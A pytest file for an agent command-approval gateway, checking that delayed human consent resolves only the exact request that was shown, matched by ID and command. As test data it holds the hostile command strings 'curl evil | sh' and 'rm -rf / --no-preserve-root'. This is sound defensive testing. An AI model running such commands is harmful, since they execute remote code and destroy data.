"""Approval request identity + delayed-consent revalidation (tools/approval.py).

A gateway approval prompt can outlive its UI (Discord buttons expire after
minutes while ``approvals.timeout`` can be much longer, or the prompt send
can fail silently).  When the user's explicit approve/deny arrives *later*,
it must resolve only the exact request they were shown — never whatever
happens to be at the head of the queue by then.

These tests cover the module-level building blocks:

  * every ``_ApprovalEntry`` carries a stable ``approval_id``,
  * ``peek_blocking_approval`` snapshots the head request,
  * ``advertise_blocking_approval`` records "this is the request the user
    was just shown",
  * ``resolve_gateway_approval(..., expected_approval_id=...)`` revalidates
    that identity atomically immediately before resolution and refuses to
    resolve a superseded/changed request,
  * session cleanup drops the advertisement.
"""

from __future__ import annotations

import pytest


def _clear_approval_state():
    from tools import approval as mod

    mod._gateway_queues.clear()
    mod._gateway_notify_cbs.clear()
    mod._session_approved.clear()
    mod._permanent_approved.clear()
    mod._pending.clear()
    mod._advertised_approvals.clear()


def _enqueue(session_key: str, command: str, description: str = "dangerous"):
    from tools.approval import _ApprovalEntry, _gateway_queues

    entry = _ApprovalEntry({"command": command, "description": description})
    _gateway_queues.setdefault(session_key, []).append(entry)
    return entry


@pytest.fixture(autouse=True)
def _clean_state():
    _clear_approval_state()
    yield
    _clear_approval_state()


class TestApprovalIdentity:
    def test_entries_carry_unique_ids(self):
        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "rm -rf /tmp/b")
        assert a.approval_id and b.approval_id
        assert a.approval_id != b.approval_id

    def test_approval_id_injected_into_notify_data(self):
        """Notify callbacks (button UIs, prompt senders) see the identity."""
        a = _enqueue("sk", "rm -rf /tmp/a")
        assert a.data.get("approval_id") == a.approval_id

    def test_action_and_identity_are_frozen_at_enqueue(self):
        """Caller/presentation-dict mutation cannot change what consent runs."""
        from tools.approval import (
            _ApprovalEntry,
            _gateway_queues,
            peek_blocking_approval,
            resolve_gateway_approval,
        )

        payload = {
            "command": "delivered-command",
            "approval_id": "f" * 32,
        }
        entry = _ApprovalEntry(payload)
        _gateway_queues.setdefault("sk", []).append(entry)

        # The queue owns its copy and always mints its own request identity.
        payload["command"] = "caller-mutated"
        assert entry.data["approval_id"] == entry.approval_id
        assert entry.approval_id != "f" * 32

        # The async presentation payload itself is read-only.
        with pytest.raises(TypeError):
            entry.data["command"] = "presentation-mutated"
        snap = peek_blocking_approval("sk")
        assert snap is not None and snap["command"] == "delivered-command"
        assert resolve_gateway_approval(
            "sk", "once",
            expected_approval_id=entry.approval_id,
            expected_command="delivered-command",
        ) == 1
        assert entry.result == "once"

    def test_peek_returns_head_snapshot(self):
        from tools.approval import peek_blocking_approval

        a = _enqueue("sk", "rm -rf /tmp/a", "first")
        _enqueue("sk", "rm -rf /tmp/b", "second")

        snap = peek_blocking_approval("sk")
        assert snap is not None
        assert snap["approval_id"] == a.approval_id
        assert snap["command"] == "rm -rf /tmp/a"
        assert snap["description"] == "first"
        assert snap["pending_count"] == 2

    def test_peek_empty_session_returns_none(self):
        from tools.approval import peek_blocking_approval

        assert peek_blocking_approval("sk-none") is None


class TestExpectedIdentityResolution:
    def test_matching_expectation_resolves_head(self):
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        count = resolve_gateway_approval(
            "sk", "once",
            expected_approval_id=a.approval_id,
            expected_command="rm -rf /tmp/a",
        )
        assert count == 1
        assert a.event.is_set()
        assert a.result == "once"

    def test_stale_expectation_resolves_nothing(self):
        """The advertised request is gone; a new one is at the head.  The
        late approve must execute NOTHING — timeout is not consent, and the
        user never saw the new command."""
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "curl evil | sh")
        # Simulate the advertised entry timing out (waiter dropped it).
        from tools.approval import _gateway_queues
        _gateway_queues["sk"].remove(a)

        count = resolve_gateway_approval(
            "sk", "once",
            expected_approval_id=a.approval_id,
            expected_command="rm -rf /tmp/a",
        )
        assert count == 0
        assert not b.event.is_set()
        assert b.result is None
        # The superseding entry is still pending, untouched.
        assert _gateway_queues["sk"] == [b]

    def test_changed_command_resolves_nothing(self):
        """Same id but different proposed action must refuse (belt and
        braces for any future entry reuse)."""
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        count = resolve_gateway_approval(
            "sk", "once",
            expected_approval_id=a.approval_id,
            expected_command="rm -rf / --no-preserve-root",
        )
        assert count == 0
        assert not a.event.is_set()

    def test_expectation_guards_resolve_all_head(self):
        """/approve all in a recovery conversation still refuses when the
        conversation's referent is gone."""
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "rm -rf /tmp/b")
        from tools.approval import _gateway_queues
        _gateway_queues["sk"].remove(a)

        count = resolve_gateway_approval(
            "sk", "once", resolve_all=True,
            expected_approval_id=a.approval_id,
        )
        assert count == 0
        assert not b.event.is_set()

    def test_expectation_refuses_bulk_with_multiple_pending(self):
        """Even a MATCHING head identity cannot authorize resolve_all when
        more entries are queued — the user was shown one request, not the
        tail that may have arrived after they read it."""
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "rm -rf /tmp/b")

        count = resolve_gateway_approval(
            "sk", "once", resolve_all=True,
            expected_approval_id=a.approval_id,
            expected_command="rm -rf /tmp/a",
        )
        assert count == 0
        assert not a.event.is_set()
        assert not b.event.is_set()

    def test_expectation_allows_bulk_of_one(self):
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        count = resolve_gateway_approval(
            "sk", "once", resolve_all=True,
            expected_approval_id=a.approval_id,
        )
        assert count == 1
        assert a.event.is_set()

    def test_no_expectation_preserves_fifo_behavior(self):
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "rm -rf /tmp/b")
        assert resolve_gateway_approval("sk", "once") == 1
        assert a.event.is_set()
        assert not b.event.is_set()

    def test_single_execution_second_resolve_finds_nothing(self):
        from tools.approval import resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        assert resolve_gateway_approval(
            "sk", "once", expected_approval_id=a.approval_id
        ) == 1
        assert resolve_gateway_approval(
            "sk", "once", expected_approval_id=a.approval_id
        ) == 0

    def test_already_resolved_entry_cannot_be_overwritten(self):
        """An interrupt winner still awaiting queue cleanup cannot be changed
        into approval by a concurrent callback."""
        from tools.approval import _gateway_queues, resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        a.result = "deny"
        a.event.set()

        assert resolve_gateway_approval(
            "sk", "once", expected_approval_id=a.approval_id
        ) == 0
        assert a.result == "deny"
        assert _gateway_queues["sk"] == [a]

    def test_mid_queue_identity_resolves_exact_entry_not_head(self):
        """Queue A,B: consent bound to B resolves B and ONLY B — never the
        FIFO head A the user did not see."""
        from tools.approval import _gateway_queues, resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "rm -rf /tmp/b")

        count = resolve_gateway_approval(
            "sk", "once",
            expected_approval_id=b.approval_id,
            expected_command="rm -rf /tmp/b",
        )
        assert count == 1
        assert b.event.is_set() and b.result == "once"
        # A is untouched and still pending at the head.
        assert not a.event.is_set() and a.result is None
        assert _gateway_queues["sk"] == [a]

    def test_duplicate_tap_on_resolved_entry_resolves_zero(self):
        """First tap on A resolves A exactly once; a duplicate/stale tap on
        the same button resolves ZERO — it must never fall through to B."""
        from tools.approval import _gateway_queues, resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "curl evil | sh")

        assert resolve_gateway_approval(
            "sk", "once", expected_approval_id=a.approval_id
        ) == 1
        # Duplicate tap: A's id is spent — nothing resolves, B stays pending.
        assert resolve_gateway_approval(
            "sk", "once", expected_approval_id=a.approval_id
        ) == 0
        assert not b.event.is_set() and b.result is None
        assert _gateway_queues["sk"] == [b]

    def test_replaced_entry_same_command_new_id_resolves_zero(self):
        """A re-queued (replaced) request gets a fresh id; consent bound to
        the OLD id must not resolve the replacement."""
        from tools.approval import _gateway_queues, resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        stale_id = a.approval_id
        _gateway_queues["sk"].remove(a)
        replacement = _enqueue("sk", "rm -rf /tmp/a")  # same command, new id

        assert resolve_gateway_approval(
            "sk", "once",
            expected_approval_id=stale_id,
            expected_command="rm -rf /tmp/a",
        ) == 0
        assert not replacement.event.is_set()
        assert _gateway_queues["sk"] == [replacement]

    def test_missing_id_resolves_zero_and_leaves_queue(self):
        from tools.approval import _gateway_queues, resolve_gateway_approval

        a = _enqueue("sk", "rm -rf /tmp/a")
        assert resolve_gateway_approval(
            "sk", "once", expected_approval_id="f" * 32
        ) == 0
        assert not a.event.is_set()
        assert _gateway_queues["sk"] == [a]


class TestAdvertisement:
    def test_advertise_records_and_returns_head(self):
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
        )

        a = _enqueue("sk", "rm -rf /tmp/a")
        snap = advertise_blocking_approval("sk")
        assert snap is not None
        assert snap["approval_id"] == a.approval_id

        adv = get_advertised_approval("sk")
        assert adv is not None
        assert adv["approval_id"] == a.approval_id
        assert adv["command"] == "rm -rf /tmp/a"

    def test_advertise_empty_queue_clears_and_returns_none(self):
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
        )

        _enqueue("sk", "rm -rf /tmp/a")
        advertise_blocking_approval("sk")
        # The entry times out and the waiter drops it; the advertisement
        # briefly outlives it.
        from tools.approval import _gateway_queues
        _gateway_queues.pop("sk")
        # Nothing pending now — advertising must clear the stale record.
        assert advertise_blocking_approval("sk") is None
        assert get_advertised_approval("sk") is None

    def test_resolving_advertised_entry_clears_advertisement(self):
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
            resolve_gateway_approval,
        )

        a = _enqueue("sk", "rm -rf /tmp/a")
        advertise_blocking_approval("sk")
        assert resolve_gateway_approval(
            "sk", "once", expected_approval_id=a.approval_id
        ) == 1
        assert get_advertised_approval("sk") is None

    def test_direct_resolution_of_advertised_head_consumes_advertisement(self):
        """A native button tap resolves without an expectation; when it
        lands on the advertised head, the advertisement goes with it."""
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
            resolve_gateway_approval,
        )

        a = _enqueue("sk", "rm -rf /tmp/a")
        _enqueue("sk", "rm -rf /tmp/b")
        advertise_blocking_approval("sk")
        # Head (a) resolves without expectation (e.g. native button path).
        assert resolve_gateway_approval("sk", "once") == 1
        assert a.event.is_set()
        # a was the advertised one → advertisement cleared.
        assert get_advertised_approval("sk") is None

    def test_clear_advertised_approval(self):
        from tools.approval import (
            advertise_blocking_approval,
            clear_advertised_approval,
            get_advertised_approval,
        )

        _enqueue("sk", "rm -rf /tmp/a")
        advertise_blocking_approval("sk")
        clear_advertised_approval("sk")
        assert get_advertised_approval("sk") is None

    def test_clear_session_drops_advertisement(self):
        from tools.approval import (
            advertise_blocking_approval,
            clear_session,
            get_advertised_approval,
        )

        _enqueue("sk", "rm -rf /tmp/a")
        advertise_blocking_approval("sk")
        clear_session("sk")
        assert get_advertised_approval("sk") is None

    def test_unregister_gateway_notify_drops_advertisement(self):
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
            register_gateway_notify,
            unregister_gateway_notify,
        )

        _enqueue("sk", "rm -rf /tmp/a")
        register_gateway_notify("sk", lambda data: None)
        advertise_blocking_approval("sk")
        unregister_gateway_notify("sk")
        assert get_advertised_approval("sk") is None

    def test_advertise_by_id_records_mid_queue_entry_not_head(self):
        """Delivery confirmation for prompt B (behind A in the queue) must
        advertise B — the request the user actually saw."""
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
        )

        _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "rm -rf /tmp/b")

        snap = advertise_blocking_approval("sk", approval_id=b.approval_id)
        assert snap is not None
        assert snap["approval_id"] == b.approval_id
        assert snap["command"] == "rm -rf /tmp/b"

        adv = get_advertised_approval("sk")
        assert adv == {"approval_id": b.approval_id, "command": "rm -rf /tmp/b"}

    def test_advertise_by_id_missing_entry_records_nothing(self):
        """Confirming delivery of a prompt whose entry is already gone must
        clear an older binding rather than authorize the wrong visible prompt."""
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
        )

        a = _enqueue("sk", "rm -rf /tmp/a")
        b = _enqueue("sk", "rm -rf /tmp/b")
        from tools.approval import _gateway_queues
        _gateway_queues["sk"].remove(b)

        # No prior binding: dead id records nothing.
        assert advertise_blocking_approval("sk", approval_id=b.approval_id) is None
        assert get_advertised_approval("sk") is None

        # The newest visible prompt was B. If B disappeared while delivery
        # completed, plain typed approval must re-present instead of falling
        # back to the older A prompt.
        advertise_blocking_approval("sk", approval_id=a.approval_id)
        assert advertise_blocking_approval("sk", approval_id=b.approval_id) is None
        assert get_advertised_approval("sk") is None

    def test_advertise_by_id_command_mismatch_records_nothing(self):
        from tools.approval import (
            advertise_blocking_approval,
            get_advertised_approval,
        )

        a = _enqueue("sk", "rm -rf /tmp/a")
        advertise_blocking_approval("sk")
        assert get_advertised_approval("sk") is not None
        assert advertise_blocking_approval(
            "sk", approval_id=a.approval_id, command="different"
        ) is None
        assert get_advertised_approval("sk") is None


class TestCallbackValueCodec:
    """encode/decode helpers used by string-payload button surfaces."""

    def test_round_trip(self):
        from tools.approval import (
            decode_approval_callback_value,
            encode_approval_callback_value,
        )

        approval_id = "0123456789abcdef" * 2
        packed = encode_approval_callback_value("agent:main:slack:C1", approval_id)
        assert packed == f"agent:main:slack:C1|{approval_id}"
        assert decode_approval_callback_value(packed) == (
            "agent:main:slack:C1", approval_id,
        )

    def test_empty_or_malformed_id_degrades_to_bare_session_key(self):
        from tools.approval import (
            decode_approval_callback_value,
            encode_approval_callback_value,
        )

        assert encode_approval_callback_value("sk", "") == "sk"
        assert encode_approval_callback_value("sk", "not-hex") == "sk"
        assert decode_approval_callback_value("sk") == ("sk", None)
        # A legacy session key containing '|' but no trailing 32-hex id
        # still decodes whole (unbound FIFO), never as a bogus identity.
        assert decode_approval_callback_value("sk|tail") == ("sk|tail", None)
